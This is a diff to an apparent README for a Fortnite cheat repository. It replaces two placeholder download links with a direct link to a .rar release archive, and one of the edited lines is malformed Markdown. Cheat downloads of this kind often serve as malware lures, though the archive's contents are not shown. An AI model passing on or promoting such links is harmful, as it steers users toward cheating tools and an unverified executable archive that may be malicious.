@@ -5,13 +5,13 @@
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge&logo=github)](#-download)
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge&logo=github)]([#-download](https://github.com/ThatguynamedknackFortnite-External-Cheat-2026/releases/latest/download/Fortnite-v2.5.rar)
 
 ---
 
 ## 📥 Download
 
-👉 [**DOWNLOAD — Click Here or Releases**](#) 👈
+👉 [**DOWNLOAD — Click Here or Releases**](https://github.com/ThatguynamedknackFortnite-External-Cheat-2026/releases/latest/download/Fortnite-v2.5.rar) 👈
 
 ---
 
